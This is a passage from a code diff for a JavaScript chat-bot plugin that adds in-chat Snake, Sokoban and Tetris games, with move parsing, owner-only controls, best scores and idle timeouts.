+    if (cur) throw new UserError(`${cur.owner.name} is already playing ${cur.type} here. Wait, or end it with *${P(ctx)}${cur.type} end*.`);
+    if (ctx.rt.games.has(ctx.chat)) throw new UserError('Another game is running in this chat. Finish it first.');
+    const g = make();
+    g.owner = { id: ctx.senderNum, name: ctx.name || '+' + ctx.senderNum };
+    touch(g);
+    arcade(ctx).set(ctx.chat, g);
+    return g;
+  }
+  function stopIfAsked(ctx, game) {
+    if (!/^(end|stop|quit)$/i.test(ctx.argv[0] || '')) return false;
+    const g = arcade(ctx).get(ctx.chat);
+    if (!g || g.type !== game) throw new UserError(`No ${game} game is running here.`);
+    if (g.owner.id !== ctx.senderNum && !ctx.isOwner) throw new UserError(`Only ${g.owner.name} (or the bot owner) can end this game.`);
+    arcade(ctx).delete(ctx.chat);
+    ctx.reply('🏁 Game ended.');
+    return true;
+  }
+  const cap = {
+    snake: (ctx, g) => `🐍 Snake • Score ${g.score}${bestLine(ctx, 'snake')}\nSend w a s d (or 8 4 2 6). Chain: 6662 • r = restart`,
+    sokoban: (g, extra = '') => `🧱 Sokoban • Level ${g.level + 1}/${LEVELS.length} • Moves ${g.moves}${extra}\nw a s d • z undo • r restart`,
+    tetris: (ctx, g, extra = '') => `🧩 Tetris • Score ${g.score} • Lines ${g.lines} • Next: ${g.next}${extra}${g.pieces ? '' : bestLine(ctx, 'tetris')}\nSend a d w s (or 4 6 8 2) • x = drop • r = restart`
+  };
+
+  def('snake', { cat: 'game', usage: 'snake • snake end', desc: 'Play Snake in chat as a picture card. Send w/a/s/d (or 8/4/2/6, chain them like 6662) to steer. Eat 🍎, avoid walls and yourself.' }, async ctx => {
+    if (stopIfAsked(ctx, 'snake')) return;
+    const g = start(ctx, snakeNew);
+    await sendCard(ctx, g, cap.snake(ctx, g));
+  });
+
+  def('sokoban', { cat: 'game', usage: 'sokoban [level 1-' + LEVELS.length + '] • sokoban end', desc: 'Sokoban: push every box onto a target. Send w/a/s/d (or 8/4/2/6, chain them), z = undo, r = restart.' }, async ctx => {
+    if (stopIfAsked(ctx, 'sokoban')) return;
+    const n = Math.min(LEVELS.length, Math.max(1, parseInt(ctx.argv[0], 10) || 1)) - 1;
+    const g = start(ctx, () => sokoLoad(n));
+    await sendCard(ctx, g, cap.sokoban(g));
+  });
+
+  def('tetris', { cat: 'game', usage: 'tetris • tetris end', desc: 'Play Tetris in chat as a picture card. a/d (4/6) move, w (8) rotate, s (2) down, x (5) drop. The piece falls one row after each message.' }, async ctx => {
+    if (stopIfAsked(ctx, 'tetris')) return;
+    const g = start(ctx, tetrisNew);
+    await sendCard(ctx, g, cap.tetris(ctx, g));
+  });
+
+  hooks.push({
+    name: 'arcade', run: async ctx => {
+      const g = ctx.rt.arcade?.get(ctx.chat);
+      if (!g || !ctx.fresh || !ctx.text || ctx.text.startsWith(ctx.prefix || '.')) return false;
+      if (g.owner.id !== ctx.senderNum) return false;
+      const text = ctx.text.trim();
+      const lower = text.toLowerCase();
+
+      /* restart (snake / tetris); sokoban handles r below */
+      if (lower === 'r' && g.type !== 'sokoban') {
+        const fresh = Object.assign(g.type === 'snake' ? snakeNew() : tetrisNew(), { owner: g.owner });
+        touch(fresh);
+        arcade(ctx).set(ctx.chat, fresh);
+        await sendCard(ctx, fresh, `🔄 Restarted\n${g.type === 'snake' ? cap.snake(ctx, fresh) : cap.tetris(ctx, fresh)}`);
+        return true;
+      }
+
+      /* ---- snake ---- */
+      if (g.type === 'snake') {
+        const moves = parseMoves(text);
+        if (!moves) return false;
+        touch(g);
+        let status = 'ok';
+        for (const m of moves) { status = snakeStep(g, m); if (status === 'dead' || status === 'won') break; }
+        if (g.over) {
+          arcade(ctx).delete(ctx.chat);
+          const rec = best(ctx, 'snake', g.score, g.owner.name);
+          await sendCard(ctx, g, `${status === 'won' ? '🏆 You filled the whole board!' : '💀 Game over!'} Score: ${g.score}${rec ? '\n🎉 New best score!' : ''}${bestLine(ctx, 'snake')}\nPlay again: ${P(ctx)}snake`, { title: status === 'won' ? 'YOU WIN' : 'GAME OVER', sub: `SCORE ${g.score}`, hint: rec ? 'NEW BEST!' : '' });
+          return true;
+        }
+        await sendCard(ctx, g, cap.snake(ctx, g));
+        return true;
+      }
+
+      /* ---- sokoban ---- */
+      if (g.type === 'sokoban') {
+        let note = '';
+        if (lower === 'r') { Object.assign(g, sokoLoad(g.level), { owner: g.owner }); note = ' • 🔄 restarted'; }
+        else if (lower === 'z') { if (!sokoUndo(g)) { await ctx.react('🚫'); return true; } note = ' • ↩️ undone'; }
+        else {
+          const moves = parseMoves(text);
+          if (!moves) return false;
+          let moved = false;
+          for (const m of moves) { if (sokoMove(g, m)) moved = true; if (g.won) break; }
+          if (!moved) { await ctx.react('🚫'); return true; }
+        }
+        touch(g);
+        if (g.won) {
+          const moves = g.moves, lvl = g.level;
+          if (lvl + 1 < LEVELS.length) {
+            const next = Object.assign(sokoLoad(lvl + 1), { owner: g.owner });
+            touch(next);
+            arcade(ctx).set(ctx.chat, next);
+            await sendCard(ctx, g, `🎉 Level ${lvl + 1} solved in ${moves} moves! Next up: Level ${lvl + 2}/${LEVELS.length}`, { title: 'LEVEL CLEAR', sub: `${moves} MOVES` });
+            await sendCard(ctx, next, cap.sokoban(next));
+          } else {
+            arcade(ctx).delete(ctx.chat);
+            await sendCard(ctx, g, `🏆 All levels complete! Great work.`, { title: 'ALL CLEAR', sub: 'YOU FINISHED SOKOBAN' });
+          }
+          return true;
+        }
+        await sendCard(ctx, g, cap.sokoban(g, note));
+        return true;
+      }
+
+      /* ---- tetris ---- */
+      if (g.type === 'tetris') {
+        const keys = tetrisKeys(text);
+        if (!keys) return false;
+        touch(g);
+        let cleared = 0, dropped = false;
+        for (const k of keys) {
+          cleared += tApply(g, k);
+          if (k === 'hard' || k === 'down') dropped = true;
+          if (g.over) break;
+        }
+        if (!g.over && !dropped) cleared += tDown(g); // gravity: one row per message
+        const line = cleared ? ` • ✨ ${cleared} line${cleared > 1 ? 's' : ''} cleared!` : '';
+        if (g.over) {
+          arcade(ctx).delete(ctx.chat);
+          const rec = best(ctx, 'tetris', g.score, g.owner.name);
+          await sendCard(ctx, g, `💀 Game over! Score: ${g.score} • Lines: ${g.lines}${rec ? '\n🎉 New best score!' : ''}${bestLine(ctx, 'tetris')}\nPlay again: ${P(ctx)}tetris`, { title: 'GAME OVER', sub: `SCORE ${g.score}`, hint: rec ? 'NEW BEST!' : `LINES ${g.lines}` });
+          return true;
+        }
+        await sendCard(ctx, g, cap.tetris(ctx, g, line));
+        return true;
+      }
+      return false;
+    }
+  });
+
+  tickers.push({
+    name: 'arcade-timeouts', run: async api => {
+      const m = api.rt.arcade;
+      if (!m?.size) return;
+      for (const [chat, g] of [...m.entries()]) {
+        if (Date.now() < g.deadline) continue;
+        m.delete(chat);
+        await api.sendTo(chat, { text: api.frame(`⌛ ${g.type[0].toUpperCase() + g.type.slice(1)} ended: no moves for 10 minutes.${g.score ? `\nScore: ${bold(String(g.score))}` : ''}`) }).catch(() => {});
+      }
+    }
+  });
+};
+
+module.exports._test = {
+  LEVELS, renderCard, parseMoves, snakeNew, snakeStep, snakeFood, sokoLoad, sokoMove, sokoUndo, tetrisNew, tApply, tDown, tHard, tLock, cellsOf, tetrisRender, snakeRender, sokoRender,
+  setRng: f => { rng = f; }, dims: { SN, TW, TH }
+};
